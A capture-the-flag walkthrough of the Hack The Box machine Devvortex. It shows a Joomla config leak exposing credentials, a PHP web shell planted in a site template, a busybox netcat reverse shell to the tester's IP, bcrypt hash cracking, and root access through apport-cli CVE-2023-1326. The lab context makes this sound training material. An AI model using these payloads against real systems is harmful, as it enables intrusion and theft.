---
icon: ubuntu
---

# Devvortex - Easy

<figure><img src="../../.gitbook/assets/image (22) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/devvortex"><strong>Devvortex</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.242 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 12:33 EDT
Nmap scan report for 10.10.11.242
Host is up (0.052s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose                                                                                                                        
Running: Linux 4.X|5.X                                                                                                                              
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5                                                                                     
OS details: Linux 4.15 - 5.19                                                                                                                       
Network Distance: 2 hops                                                                                                                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                             
                                                                                                                                                    
TRACEROUTE (using port 143/tcp)                                                                                                                     
HOP RTT      ADDRESS                                                                                                                                
1   96.29 ms 10.10.16.1                                                                                                                             
2   35.24 ms 10.10.11.242
```

Nmap scan reveals a redirect let's add it to our `/etc/hosts` file

```bash
10.10.11.242	devvortex.htb
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

Checking out the site it seemed static, since we have a domain name. Let's check for subdomains

#### Subdomain Enumeration

{% code overflow="wrap" %}
```bash
wfuzz -c -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://devvortex.htb' -H 'HOST: FUZZ.devvortex.htb' --hw 10
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

Discovered a new subdomain, I'll add it to my hosts file and check it out

```bash
10.10.11.242	devvortex.htb dev.devvortex.htb
```

<figure><img src="../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

Another static site

#### Directory Busting

```bash
dirsearch -u http://dev.devvortex.htb
```

<figure><img src="../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

Directory busting reveals an interesting endpoint!

<figure><img src="../../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>

There is an instance of Joomla hosted here! Default credentials do not seem to work

I managed to find the version location of Joomla on Github.

{% embed url="https://github.com/joomla/joomla-cms/blob/5.4-dev/language/en-GB/langmetadata.xml" %}

Let's check out this website's version

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Now that we have a version let's look for an exploit

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

We found one close enough to our version. Let's take a look at it.&#x20;

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Let's check out this information disclosure url

```url
http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

There is a user and password here. Let's see if they work on the site!

```
lewis:P4ntherg0t1n5r3c0n##
```

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Joomla RCE</mark>&#x20;

gp tp System > Site Templates

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Click on the site template&#x20;

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

Inside the template you will find a multitude of php files&#x20;

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

Let's replace one of them with a simple reverse shell command

```php
<?php system($_REQUEST['cmd']); ?>
```

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

ok it works. Now we can run commands on the system, I checked and nc is on the machine let's get an easy reverse shell using the following payload

```bash
busybox nc 10.10.16.2 80 -e /bin/bash
```

Make sure you have a listener ready, before using this&#x20;

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

During manual enumeration I discovered mysql running on the local machine as the mysql user. And that there is another user besides root on the machine. There might be some credentials stored in the DB let's check it out

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

I am going to try and use lewis credentials to login to the DB

```bash
mysql -h localhost -u lewis -pP4ntherg0t1n5r3c0n##
```

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

They worked let's enumerate the DB

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

We were able to extract 2 hashes, let's try and crack them

### <mark style="color:$primary;">Cracking Bcrypt Hashes</mark>

```bash
john hashes -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

we were able to crack 1 hash, and it works for logan

<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

```
logan:tequieromucho
```

This user is allowed to ssh. Let's do that

```bash
ssh logan@devvortex.htb
```

### <mark style="color:$primary;">apport-cli CVE-2023-1326 privesc</mark>

<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

Interesting command I haven't seen it before. I am going to do some research on it

{% embed url="https://github.com/diego-tella/CVE-2023-1326-PoC" %}

After googling it the first thing that popped up was this privesc POC I found on github. I'll use it to escalate my privileges

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

First we will need to create a crash file. Let's start a program and kill it abruptly to create a crash scenario

<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

We managed to create a crash file now we can simply run the commands in the poc

```bash
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
```

<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

after running and pressing V wait for the output to finish then type&#x20;

```bash
!/bin/bash
```

and you will have a shell as root, My command got decimated by the output but its there

<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
